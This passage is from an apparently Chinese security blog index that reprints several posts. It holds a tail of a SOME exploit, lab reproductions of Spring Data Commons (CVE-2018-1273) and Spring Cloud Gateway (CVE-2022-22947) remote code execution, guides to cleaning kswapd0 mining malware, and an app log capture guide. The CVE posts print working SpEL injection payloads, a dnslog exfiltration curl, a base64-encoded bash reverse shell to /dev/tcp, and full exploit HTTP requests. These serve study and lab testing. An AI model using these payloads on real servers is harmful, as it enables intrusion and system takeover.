class="string">&#x27;https://www.someattack.com/Playground/ColorPicker.php?callback=document.body.firstElementChild.lastElementChild.lastElementChild.lastElementChild.previousSibling.previousSibling.lastElementChild.click&#x27;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">          &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        ,<span class="number">1000</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<h2><span id="0x04-漏洞防御">0x04 漏洞防御</span></h2><blockquote>
-<p>回调函数使用静态函数命名，限制该函数的调用范围。<br>谷歌的解决方法是，把回调函数加入服务器端的白名单。<br>Hayak建议，注册回调函数。</p>
-</blockquote>
-<h2><span id="参考链接">参考链接</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.someattack.com/Playground/">https://www.someattack.com/Playground/</a><br><a target="_blank" rel="noopener" href="http://blog.safedog.cn/?p=13">http://blog.safedog.cn/?p=13</a><br><a target="_blank" rel="noopener" href="http://www.aqniu.com/hack-geek/5075.html">http://www.aqniu.com/hack-geek/5075.html</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SOME/" rel="tag">SOME</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/10/25/CVE-2018-1273-Spring-Data/">
-                Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）漏洞验证与getshell
-            </a>
-        </h2>
-    
-    <time>
-        Oct 25, 2023
-    </time>
-    <section class="content">
-        <h1><span id="spring-data-commons-远程命令执行漏洞cve-2018-1273漏洞验证与getshell">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）漏洞验证与getshell</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45300786/article/details/119323425">樱浅沐冰</a> 并作补充</p>
-</blockquote>
-<h2><span id="影响版本">影响版本</span></h2><blockquote>
-<p>Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)<br>Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)<br>Spring Data Commons 2.0 to 2.0.5 (Kay SR5)<br>Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p>
-</blockquote>
-<h2><span id="复现过程">复现过程</span></h2><blockquote>
-<p>vulhub<br>详细过程请看<a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/111413971?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162786362316780269821706%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=162786362316780269821706&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-111413971.pc_v2_rank_blog_default&utm_term=CVE-2018-1273&spm=1018.2226.3001.4450">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</a></p>
-</blockquote>
-<h3><span id="一-验证">一、验证</span></h3><blockquote>
-<p>这里使用dnslog来验证。<br>先获取一个dns地址<br>t15gcx.dnslog.cn<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/1.png" alt="image"> </p>
-<p>拼接命令<br><code>curl </code>whoami<code>.t15gcx.dnslog.cn</code></p>
-</blockquote>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64编码</a><br>对反弹shell的POC进行base64编码（java反弹shell都需要先编码，不然不会成功，原因貌似是runtime不支持管道符）<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/2.png" alt="image"> </p>
-<p><code>bash -c &#123;echo,Y3VybCBgd2hvYW1pYC50MTVnY3guZG5zbG9nLmNu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
-</blockquote>
-<h3><span id="exp">Exp</span></h3><blockquote>
-<p>替换对应的payload，重新发送数据包<br>成功反弹回显到dnslog上<br><code>username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;bash -c &#123;echo,Y3VybCBgd2hvYW1pYC50MTVnY3guZG5zbG9nLmNu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;)]=&amp;password=&amp;repeatedPassword=</code></p>
-<p><img src="/2023/10/25/CVE-2018-1273-Spring-Data/3.png" alt="image"> </p>
-</blockquote>
-<h3><span id="二-反弹shell">二、反弹shell</span></h3><blockquote>
-<p>反弹shell<br><code>bash -i &gt;&amp; /dev/tcp/192.168.100.23/9090 0&gt;&amp;1</code></p>
-</blockquote>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64编码</a><br>对反弹shell的POC进行base64编码（java反弹shell都需要先编码，不然不会成功，原因貌似是runtime不支持管道符）<br><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEwMC4yMy85MDkwIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code><br>监听9090端口<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/4.png" alt="image"> </p>
-</blockquote>
-<blockquote>
-<p>替换掉curlwhoami.t15gcx.dnslog.cn对应的payload，重新发送数据包<br>成功反弹shell<br><img src="/2023/10/25/CVE-2018-1273-Spring-Data/5.png" alt="image"> </p>
-</blockquote>
-<h2><span id="参考文章">参考文章</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/111413971?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162786362316780269821706%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=162786362316780269821706&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-111413971.pc_v2_rank_blog_default&utm_term=CVE-2018-1273&spm=1018.2226.3001.4450">Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</a><br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/spring/CVE-2018-1273">Vulhub CVE-2018-1273</a></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Spring/" rel="tag">Spring</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/10/25/kswapd0-CPU-1/">
-                服务器（Linux）挖矿木马病毒（kswapd0进程使cpu爆满）
-            </a>
-        </h2>
-    
-    <time>
-        Oct 25, 2023
-    </time>
-    <section class="content">
-        <h1><span id="服务器linux挖矿木马病毒kswapd0进程使cpu爆满">服务器（Linux）挖矿木马病毒（kswapd0进程使cpu爆满）</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_47831505/article/details/123939089">飞川撸码</a> 并作补充</p>
-</blockquote>
-<h2><span id="前言">前言</span></h2><blockquote>
-<p>由于本人的阿里云服务器遭受攻击，被挖矿，导致CPU爆满，同时受到阿里云官方的邮箱、短信以及电话通知（监管部门是不允许服务器被直接或者间接挖矿）<br>首先是CPU爆满，远程登录不了，通过将服务器重启以后可以远程登录了。以kswapd0进程为例，其他进程类似，下面就是具体步骤了。<br>可参考阿里云的：挖矿程序处理最佳实践<br>注：如果你的服务器购买了付费版云安全中心，在云安全中心插件正常的前提下，可以利用付费版的主动防御及安全告警处理的功能来手动扫描下，对于检测到的威胁，你可以在安全告警处理页面进一步核实处理。应该可以直接处理掉。(如果没有，看下面的处理)<br><img src="/2023/10/25/kswapd0-CPU-1/1.png" alt="image"> </p>
-<p><img src="/2023/10/25/kswapd0-CPU-1/2.png" alt="image"> </p>
-</blockquote>
-<h2><span id="1在系统里面top一下查看了所有进程">1.在系统里面top一下，查看了所有进程</span></h2><blockquote>
-<p><img src="/2023/10/25/kswapd0-CPU-1/3.png" alt="image"> </p>
-<p>看到这些进程一直在变化，但是，主要是由于kswapd0进程在作怪，占据了99%以上的CUP，查找资料后，发现它就是挖矿进程。</p>
-</blockquote>
-<h2><span id="2排查kswapd0进程">2.排查kswapd0进程</span></h2><h3><span id="21-执行命令netstat-antlp-grep-kswapd0-查询该进程的网络信息">2.1 执行命令netstat -antlp | grep kswapd0 查询该进程的网络信息</span></h3><blockquote>
-<p><code>netstat -antlp | grep kswapd0</code><br><img src="/2023/10/25/kswapd0-CPU-1/4.png" alt="image"> </p>
-</blockquote>
-<blockquote>
-<p>发现一个与本机端口通信的是一个荷兰的ip<br><img src="/2023/10/25/kswapd0-CPU-1/5.png" alt="image"> </p>
-</blockquote>
-<h3><span id="22执行命令netstat-antlp-grep-1943619030-查询该地区ip的其他网络占用情况">2.2执行命令netstat -antlp | grep 194.36.190.30 查询该地区ip的其他网络占用情况</span></h3><blockquote>
-<p><code>netstat -antlp | grep 194.36.190.30</code><br><img src="/2023/10/25/kswapd0-CPU-1/6.png" alt="image"> </p>
-<p>发现只有这一个进程（当然，很有可能花卉有其他进程）</p>
-</blockquote>
-<h2><span id="3-查找进程的详细信息">3. 查找进程的详细信息</span></h2><blockquote>
-<p>我们来到&#x2F;proc&#x2F;目录下查找对应的pid号，即&#x2F;proc&#x2F;497。可以在这目录下找到kswapd0进程的详细信息。<br><code>ll /proc/497</code><br><img src="/2023/10/25/kswapd0-CPU-1/7.png" alt="image"> </p>
-</blockquote>
-<h2><span id="4查看进程的工作空间">4.查看进程的工作空间</span></h2><blockquote>
-<p><code>ps -ef | grep kswapd0</code><br><img src="/2023/10/25/kswapd0-CPU-1/8.png" alt="image"> </p>
-<p>执行完后可以看到进程的pid以及进程相关文件的位置</p>
-</blockquote>
-<h2><span id="5切换到木马程序目录并删除">5.切换到木马程序目录并删除</span></h2><blockquote>
-<p><img src="/2023/10/25/kswapd0-CPU-1/9.png" alt="image"> </p>
-<p><code>rm -rf /var/tmp/.copydie</code></p>
-</blockquote>
-<h2><span id="6清理定时任务">6.清理定时任务</span></h2><blockquote>
-<p>很多病毒都是有会在定时任务里面，以至于很难清理清楚。（由于我的服务器买油开启定时任务服务，所以里面没有任务）</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看定时任务：</span><br><span class="line">crontab -l</span><br><span class="line">清理计划任务: </span><br><span class="line">crontab -e</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>清除后将定时任务里的相关文件都清理干净，若有其他用户，将其他用户的定时任务也清理。</p>
-</blockquote>
-<h2><span id="7杀掉kswapd0进程">7.杀掉kswapd0进程</span></h2><blockquote>
-<p>最好把木马程序和定时任务都清理完了再杀掉,要不然还会自动重启<br><code>kill -9 497</code> #kill -9 kswapd0进程的PID</p>
-</blockquote>
-<h2><span id="8总结">8.总结</span></h2><blockquote>
-<p>就是跟着进程找找目录，然后杀进程，清目录<br>清定时任务<br>服务器的ftp端口最好别用22,密码尽量设置复杂点<br>尽量用密钥连接服务器，最好别用账号密码连接<br>封闭不使用的端口，做到用一个开一个（通过防火墙和安全组策略）<br>密码增强复杂性<br>及时修补系统和软件漏洞</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/kswapd0/" rel="tag">kswapd0</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/10/25/kswapd0-CPU-0/">
-                解决kswapd0 CPU占用率高的问题
-            </a>
-        </h2>
-    
-    <time>
-        Oct 25, 2023
-    </time>
-    <section class="content">
-        <h1><span id="解决kswapd0-cpu占用率高的问题">解决kswapd0 CPU占用率高的问题</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/Remberthename/article/details/106796887">年迈的老头子</a> 并作补充</p>
-</blockquote>
-<blockquote>
-<p>连接服务器时发现cpu使用率100%，使用top命令查看是kswapd0进程占用cpu极高<br><img src="/2023/10/25/kswapd0-CPU-0/1.png" alt="image"> </p>
-</blockquote>
-<blockquote>
-<p>百度下后知道kswapd0进程的作用：<br>它是虚拟内存管理中，负责换页的，操作系统每过一定时间就会唤醒kswapd ，看看内存是否紧张，如果不紧张，则睡眠，在 kswapd 中，有2个阀值，pages_hige 和 pages_low，当空闲内存页的数量低于 pages_low的时候，kswapd进程就会扫描内存并且每次释放出32 个free pages，直到 free page的数量到达pages_high。通过阻止kswapd0进程过渡活跃地消耗CPU的方法是设置大页内存。</p>
-</blockquote>
-<blockquote>
-<p>刚开始以为是本身服务器内存小的问题后来翻阅了其他大佬的博客后使用netstat -antlp查看了下系统外部连接，发现存在一个意大利的ip占用kswapd0进程和荷兰的ip占用rsync进程，，经查询后rsync是一个数据传输工具，此时意识到了事情的严重性<br><img src="/2023/10/25/kswapd0-CPU-0/2.png" alt="image"> </p>
-</blockquote>
-<blockquote>
-<p>此时开始查找进程占用的文件路径</p>
-</blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /proc/1266</span><br><span class="line"><span class="built_in">ls</span> -l exe</span><br><span class="line"><span class="built_in">cd</span> /proc/1246</span><br><span class="line"><span class="built_in">ls</span> -l exe</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><img src="/2023/10/25/kswapd0-CPU-0/3.png" alt="image"> </p>
-</blockquote>
-<blockquote>
-<p>查询过后发现是使用prel写的一个脚本，删除整个文件夹后发下这两个进程依然存在，然后就开始了简单粗暴的过程直接kill掉这两个进程，kill点之后发现这两个进程不在了cpu的使用率下来了观察一段时间后确定cpu使用率正常了<br><img src="/2023/10/25/kswapd0-CPU-0/4.png" alt="image"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/kswapd0/" rel="tag">kswapd0</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/10/25/Catch-AppLog/">
-                app日志抓取
-            </a>
-        </h2>
-    
-    <time>
-        Oct 25, 2023
-    </time>
-    <section class="content">
-        <h1><span id="app日志抓取">app日志抓取</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42610167/article/details/104838634">测试之道.</a> 并作补充</p>
-</blockquote>
-<h2><span id="日志抓取">日志抓取</span></h2><blockquote>
-<p>1.首先通过adb devices查看设备是否连接成功<br>2.通过adb logcat命令抓取日志，保存到D盘下的1文件夹下面的log.txt文件中:<br><code>adb logcat -v time (-v time 为了获取日志时间)</code><br><img src="/2023/10/25/Catch-AppLog/1.png" alt="image"> </p>
-<p>3.将程序运行在前台，通过命令查看应用包名称：adb shell dumpsys | findstr “mFocusedActivity”<br><img src="/2023/10/25/Catch-AppLog/2.png" alt="image"> </p>
-<p>4.在导出的 log.txt 文件中搜索应用包名字，查看日志问题</p>
-</blockquote>
-<h3><span id="发生-crash-问题搜索关键字-force-finishing">发生 crash 问题，搜索关键字 force finishing</span></h3><blockquote>
-<p><img src="/2023/10/25/Catch-AppLog/3.png" alt="image"> </p>
-</blockquote>
-<h3><span id="发生-anr-问题">发生 anr 问题</span></h3><blockquote>
-<p>1.搜索关键字 anr in<br>2.treces.txt (adb shell–cd data – cd anr– traces.txt) （获取一次无响应）<br>3.dropbox.txt （adb shell – cd data – cd system – cd dropbox）（获取多次）</p>
-</blockquote>
-<h2><span id="一-mac-x2f-windows-电脑抓取android手机app-日志的方法">一、Mac &#x2F; Windows 电脑抓取Android手机APP 日志的方法</span></h2><h3><span id="电若脑只连接一个android设备">电若脑只连接一个Android设备</span></h3><blockquote>
-<p>1、电脑安装adb工具<br>2、手机打开usb调试：开发者选项开启–&gt;usb调试开启–&gt;允许usb调试<br>3、查询手机上第三方apk包的包名：<br>打开控制台：cmd<br>查询包名：adb shell pm list packages -3；（如：adb -s 11870469 shell pm list packages -3）<br>若琪app包名为 com.rokid.mobile<br>4、查询若琪app的进程号：adb shell ps | grep com.rokid.mobile （查出两个进程号）<br>5、电脑的当前路径创建文件存放日志：touch log<br>6、给文件操作权限：chmod 777 log<br>7、查询若琪APP的日志并导入到log文件：adb shell logcat |grep -e “进程号1” -e “进程号2” &gt;&gt; log<br>（如：adb -s 11870469 shell logcat |grep -e “6998” -e “7081” &gt;&gt; log ）</p>
-</blockquote>
-<h3><span id="电脑连接多个android设备">电脑连接多个Android设备：</span></h3><blockquote>
-<p>1、电脑安装adb工具<br>2、手机打开usb调试：开发者选项开启–&gt;usb调试开启<br>3、cmd 打开控制台<br>4、adb devices查询设备号<br>5、查询第三方apk包的包名：adb -s 设备号 shell pm list packages -3；（如：adb -s 11870469 shell pm list packages -3）<br>若琪app包名为com.rokid.mobile<br>6、查询第三方apk进程号：adb -s 设备号 shell ps | grep com.rokid.mobile<br>7、电脑的当前路径创建文件存放日志：touch log<br>8、给文件操作权限：chmod 777 log<br>9、查询若琪APP的日志并导入到log文件：adb -s 设备号 shell logcat |grep -e “进程号1” -e “进程号2” &gt;&gt; log<br>（如：adb -s 11870469 shell logcat |grep -e “6998” -e “7081” &gt;&gt; log ）</p>
-</blockquote>
-<h2><span id="二-mac电脑上抓取ios手机app日志的方法使用mac电脑自带的控制台">二、Mac电脑上抓取IOS手机APP日志的方法：使用Mac电脑自带的“控制台”</span></h2><blockquote>
-<p>Mac电脑对iOS手机的兼容性非常好，抓日志也很简单，ios手机连上电脑，打开控制台就开始抓取日志了，抓取的是全部的系统日志，用“RokidApp”过滤出若琪APP的日志<br><img src="/2023/10/25/Catch-AppLog/4.png" alt="image"> </p>
-<p><img src="/2023/10/25/Catch-AppLog/5.png" alt="image"> </p>
-</blockquote>
-<h2><span id="三-windows电脑上抓取ios-手机app日志的方法可以用itools工具">三、Windows电脑上抓取ios 手机APP日志的方法：可以用iTools工具</span></h2><blockquote>
-<p>1、下载安装itools工具：<a target="_blank" rel="noopener" href="http://www.mydown.com/soft/59/11963059.shtml">http://www.mydown.com/soft/59/11963059.shtml</a><br>2、插上ios手机之后要先安装驱动，驱动安装成功才能连上ios手机<br>3、如下图为连接手机成功<br><img src="/2023/10/25/Catch-AppLog/6.png" alt="image"> </p>
-<p>4、点击“工具箱”，点击“实时日志”，ios上所有APP的日志都能打印出来<br><img src="/2023/10/25/Catch-AppLog/7.png" alt="image"> </p>
-<p>5、保存系统日志,文件名为AppLog<br><img src="/2023/10/25/Catch-AppLog/8.png" alt="image"> </p>
-<p>6、cmd 打开控制台，过滤出若琪APP的日志并查看日志<br>cat AppLog | grep -e “RokidApp”<br>7、将若琪APP日志导出<br>创建文件：touch RokidAppLog<br>给文件赋权限：chmod 777 RokidAppLog<br>导出日志： cat AppLog | grep -e “RokidApp” &gt;&gt; RokidAppLog</p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/AppLog/" rel="tag">AppLog</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/10/25/CVE-2022-22947-Spring-Cloud/">
-                Spring Cloud Gateway rce（CVE-2022-22947）
-            </a>
-        </h2>
-    
-    <time>
-        Oct 25, 2023
-    </time>
-    <section class="content">
-        <h1><span id="spring-cloud-gateway-rcecve-2022-22947">Spring Cloud Gateway rce（CVE-2022-22947）</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45794666/article/details/123338198">6right</a> 并作补充</p>
-</blockquote>
-<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
-<p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。<br>也是codeql发现的</p>
-</blockquote>
-<h2><span id="漏洞影响">漏洞影响</span></h2><blockquote>
-<p>3.1.0<br>3.0.0至3.0.6<br>3.0.0之前的版本</p>
-</blockquote>
-<h2><span id="复现漏洞">复现漏洞</span></h2><blockquote>
-<p>首先，发送以下请求以添加包含恶意SpEL 表达式的路由器：</p>
-</blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.132:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>333</span><br><span class="line"></span><br><span class="line"><span class="language-coffeescript">&#123;</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;id&quot;</span>: <span class="string">&quot;hacktest&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">  <span class="string">&quot;filters&quot;</span>: [&#123;</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;AddResponseHeader&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">    <span class="string">&quot;args&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Result&quot;</span>,</span></span><br><span class="line"><span class="language-coffeescript">      <span class="string">&quot;value&quot;</span>: <span class="string">&quot;<span class="subst">#&#123;<span class="keyword">new</span> <span class="built_in">String</span>(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(<span class="keyword">new</span> <span class="built_in">String</span>[]&#123;\<span class="string">&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span></span></span></span></span><br><span class="line"><span class="subst"><span class="string"><span class="language-coffeescript">    &#125;</span></span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &#125;],</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">  &quot;</span>uri<span class="string">&quot;: &quot;</span>http://example.com<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="language-coffeescript">&#125;</span></span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>反弹shell将命令替换为base64命令即可<br>Content-Type: application&#x2F;json</p>
-<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/1.png" alt="image"> </p>
-</blockquote>
-<blockquote>
-<p>其次，刷新网关路由器。SpEL 表达式将在此步骤中执行：</p>
-</blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/actuator/gateway/refresh</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.132:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/2.png" alt="image"> </p>
-</blockquote>
-<blockquote>
-<p>第三，发送以下请求以检索结果：</p>
-</blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/actuator/gateway/routes/hacktest</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.159.132:8080</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/3.png" alt="image"> </p>
-</blockquote>
-<blockquote>
-<p>查看所有路由</p>
-</blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/actuator/gateway/routes</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span> 123.58.236.76:40279</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p><img src="/2023/10/25/CVE-2022-22947-Spring-Cloud/4.png" alt="image"> </p>
-</blockquote>
-<blockquote>
-<p>最后，发送一个 DELETE 请求来删除我们的恶意路由器：</p>
-</blockquote>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="string">/actuator/gateway/routes/lyy9</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>123.58.236.76:40279</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: 